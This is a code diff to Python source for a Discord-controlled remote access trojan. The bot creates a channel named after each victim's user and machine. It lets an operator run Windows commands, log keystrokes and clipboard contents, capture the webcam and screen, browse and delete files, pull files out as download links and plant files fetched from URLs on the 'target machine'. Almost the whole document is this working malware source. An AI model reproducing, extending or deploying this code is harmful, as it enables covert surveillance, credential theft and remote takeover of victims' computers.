@@ -1,4 +1,4 @@
-import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio
+import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, platform, json
 import discord, io, aiohttp
 
 from Clip_logging import Cliplogger
@@ -6,7 +6,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'BOT-TOKEN'
+TOKEN = 'YOUR TOKEN HERE'
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -15,58 +15,49 @@ intent.message_content = True
 bot = commands.Bot(command_prefix=".", intents=intent)
 klogger = Keylogger()
 clogger = Cliplogger()
+prefix = '.'
 
-@bot.event
-async def on_command_error(ctx: commands.Context, error):
-    if isinstance(error, commands.CommandNotFound):
-        await ctx.send(f"unkown command '{ctx.invoked_with}', type '.menu' for help")
-        return
+def get_current_userAndMachine():
+    user = os.getlogin()
+    machine = platform.node()
+    return user, machine
 
-@bot.command()
+async def who(ctx: commands.Context):
+    user, machine = get_current_userAndMachine()
+    await ctx.send(f"**current user:**\n```\n{user}\n```**current machine:**\n```\n{machine}\n```")
+
 async def hello(ctx: commands.Context):
     await ctx.send(f"hello, welcome! {ctx.author.mention}")
 
-@bot.command()
 async def cliplog_start(ctx: commands.Context):
     await ctx.send("starting cliplogger..")
     clogger.start_cliplog()
     await ctx.send("cliplogger started!")
 
-@bot.command()
 async def cliplog_read(ctx: commands.Context):
     output = clogger.wrap_read_cliplog()
     await ctx.send(f"**cliplogger dump:**\n```\n{output}\n```")
 
-@bot.command()
 async def cliplog_stop(ctx: commands.Context):
     await ctx.send("stopping cliplogger..")
     clogger.stop_cliplog()
     await ctx.send("cliplogger stopped!")
 
-@bot.command()
 async def keylog_start(ctx: commands.Context):
     await ctx.send("starting keylogger..")
     klogger.start_log()
     await ctx.send("keylogger started!")
 
-@bot.command()
 async def keylog_read(ctx: commands.Context):
     data = klogger.baca_log()
     await ctx.send(f"**keylogger dump:**\n```\n{data}\n```")
 
-@bot.command()
 async def keylog_stop(ctx: commands.Context):
     await ctx.send("stopping keylogger..")
     klogger.stop_listener()
     await ctx.send("keylogger stopped!")
 
-@bot.command()
 async def upload(ctx: commands.Context, url=None, local_file=None):
-
-    if not url:
-        await ctx.send("enter a url to request a file into")
-        return
-    
     try:
         if not local_file:
             parsed = urlparse(url)
@@ -101,7 +92,6 @@ async def upload(ctx: commands.Context, url=None, local_file=None):
     except Exception as e:
         await ctx.send(f"{e}")
 
-@bot.command()
 async def download(ctx: commands.Context, file:str, time:str="24h"):
     if not os.path.exists(file):
         await ctx.send("file not found")
@@ -175,9 +165,12 @@ async def download(ctx: commands.Context, file:str, time:str="24h"):
     except Exception as e:
         await ctx.send(f"{e}")
 
-@bot.command()
-async def size(ctx: commands.Context, file):
+async def size(ctx: commands.Context, file=None):
     try:
+        if not file:
+            ctx.send("enter a file to calculate their size")
+            return
+        
         if os.path.exists(file) and os.path.isfile(file):
             filesize = os.path.getsize(file)
             await ctx.send(f"the file size of '{file}' is {str(filesize)} byte")
@@ -190,7 +183,6 @@ async def size(ctx: commands.Context, file):
     except OSError as e:
         await ctx.send(f"{e}")
 
-@bot.command()
 async def exe(ctx: commands.Context,*, cmd: str = None):
     if not cmd:
         return await ctx.send("enter a command you want to run")
@@ -228,7 +220,6 @@ async def exe(ctx: commands.Context,*, cmd: str = None):
     except Exception as e:
         await ctx.send(f"**TERMINAL ERROR:** ```\n{e}\n```")
 
-@bot.command()
 async def ls(ctx: commands.Context, *, path: str = '.'):
     def scan(target):
             apath = os.path.abspath(target)
@@ -286,7 +277,6 @@ async def ls(ctx: commands.Context, *, path: str = '.'):
     except Exception as e:
         await ctx.send(f"{e}")
 
-@bot.command()
 async def screenshot(ctx: commands.Context):
     pyautogui.screenshot("ss.png")
     file = "ss.png"
@@ -297,7 +287,6 @@ async def screenshot(ctx: commands.Context):
     else:
         await ctx.send("can't take a screenshot")
 
-@bot.command()
 async def snapcam(ctx: commands.Context):
     try:
         cap = cv2.VideoCapture(0)
@@ -313,11 +302,9 @@ async def snapcam(ctx: commands.Context):
     except Exception as e:
         await ctx.send(f"can't access camera:\n```{e}```")
 
-@bot.command()
 async def marco(ctx: commands.Context):
     await ctx.send(f"polo! here's the latency: {round(bot.latency*1000)}ms")
 
-@bot.command()
 async def cd(ctx: commands.Context,*, path: str = None):
     try:
         if path is None:
@@ -332,7 +319,6 @@ async def cd(ctx: commands.Context,*, path: str = None):
     except NotADirectoryError:
         await ctx.send(f"This is a file, not a directory")
 
-@bot.command()
 async def rmv(ctx: commands.Context, file:str=None):
     try:
         if file is None:
@@ -347,5 +333,172 @@ async def rmv(ctx: commands.Context, file:str=None):
         await ctx.send(f"you have no permission to remove file '{file}'")
     except (OSError, Exception) as e:
         await ctx.send(f"{e}")
+
+async def MakeandJoinGuild(guild):
+    bot_user, bot_machine = get_current_userAndMachine()
+    formatted_name = f"{bot_user}_{bot_machine}".lower().replace(" ", "-")
+    existing_ch = discord.utils.get(guild.text_channels, name=formatted_name)
+
+    if not existing_ch:
+        try:
+            new_ch = await guild.create_text_channel(formatted_name)
+            await new_ch.send("Hello! i'm ON!")
+        except discord.Forbidden:
+            print("cannot make channel")
+    else:
+        try:
+            await existing_ch.send("I'm ON!")
+        except discord.Forbidden:
+            print("cannot send messages")
+
+async def help(ctx: commands.Context):
+    help = (
+        "**commands:**\n"
+        "```\n"
+        "::GENERAL COMMAND\n"
+        ".help      >> shows this message\n"
+        ".cd        >> change directory\n"
+        ".ls        >> list directory\n"
+        ".who       >> shows current user and machine\n"
+        ".hello     >> to check if bot still on\n"
+        ".marco     >> check latency\n"
+        ".rmv       >> remove file\n"
+        ".exe       >> execute windows command\n"
+        ".size      >> calculate file size\n"
+        "\n"
+        "::FILE TRANSFER\n"
+        ".download  >> turns a file into downloadable link\n"
+        ".upload    >> request a file from a url and plant it in target machine\n"
+        "\n"
+        "::LOGGER\n"
+        "   ::KEYLOGGING\n"
+        "    .keylog_start  >> start keylogger\n"
+        "    .keylog_read   >> dumps keylogger\n"
+        "    .keylog_stop   >> stops keylogger\n"
+        "   ::CLIPLOGGING\n"
+        "    .cliplog_start >> start clipboard logger\n"
+        "    .cliplog_read  >> dumps clipboard logger\n"
+        "    .cliplog_stop  >> stops clipboard logger\n"
+        "```"
+    )
+    await ctx.send(help)
+
+@bot.event
+async def on_ready():
+    for guild in bot.guilds:
+        await MakeandJoinGuild(guild)
+
+@bot.event
+async def on_guild_join(guild):
+    await MakeandJoinGuild(guild)
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+    txt = message.content.strip()
+
+    if txt.startswith(prefix):
+        part = txt.split(" ")
+        command = part[0].lower()
+        arg = part[1:]
+        
+        ctx = await bot.get_context(message)
+
+        if command == '.cd':
+            if not arg:
+                await cd(ctx)
+            else:
+                path = " ".join(arg)
+                await cd(ctx, path=path)
+        elif command == '.ls':
+            if not arg:
+                await ls(ctx)
+            else:
+                path = " ".join(arg)
+                await ls(ctx, path=path)
+        elif command == ".exe":
+            if not arg:
+                await exe(ctx)
+            else:
+                cmd = " ".join(arg)
+                await exe(ctx, cmd=cmd)
+        elif command == ".rmv":
+            if not arg:
+                await rmv(ctx)
+            else:
+                file = " ".join(arg)
+                await rmv(ctx, file=file)
+        elif command == ".size":
+            if not arg:
+                await size(ctx)
+            else:
+                file = " ".join(arg)
+                await size(ctx, file=file)
+
+        elif command == ".download":
+            if not arg:
+                await ctx.send("wrong formatting, should be `.download <file>.<ext>` or `.download <file>.<ext> <time><h/m/d>`")
+                return
+            LastWord = arg[-1]
+            if LastWord.endswith(('h', 'm', 'd')) and any(char.isdigit() for char in LastWord):
+                time = LastWord
+                FileInput = " ".join(arg[:-1])
+            else:
+                time = '24h'
+                FileInput = " ".join(arg)
+            
+            if not FileInput:
+                await ctx.send("enter a file to turn into a link")
+                return
+            
+            await download(ctx, file=FileInput, time=time)
+            return
+        elif  command == ".upload":
+            UrlInput = None
+            fileInput = None
+
+            if arg:
+                if arg[0].startswith(("https://", "http://")):
+                    UrlInput = arg[0]
+
+                    if len(arg) > 1:
+                        fileInput = " ".join(arg[1:])
+                else:
+                    fileInput = " ".join(arg)
+            await upload(ctx, UrlInput, fileInput)
+            return
+        
+        elif command == ".marco":
+            await marco(ctx)
+        elif command == ".hello":
+            await hello(ctx)
+        elif command == ".who":
+            await who(ctx)
+
+        elif command == ".snapcam":
+            await snapcam(ctx)
+        elif command == ".screenshot":
+            await screenshot(ctx)
+
+        elif command == ".cliplog_start":
+            await cliplog_start(ctx)
+        elif command == ".cliplog_read":
+            await cliplog_read(ctx)
+        elif command == ".cliplog_stop":
+            await cliplog_stop(ctx)
+
+        elif command == ".keylog_start":
+            await keylog_start(ctx)
+        elif command == ".keylog_read":
+            await keylog_read(ctx)
+        elif command == ".keylog_stop":
+            await keylog_stop(ctx)
+
+        elif command == ".help":
+            await help(ctx)
+        else:
+            await ctx.send(f"unknown command '{command}', type '.help' for help")
+            return
 
 bot.run(TOKEN, reconnect=True)
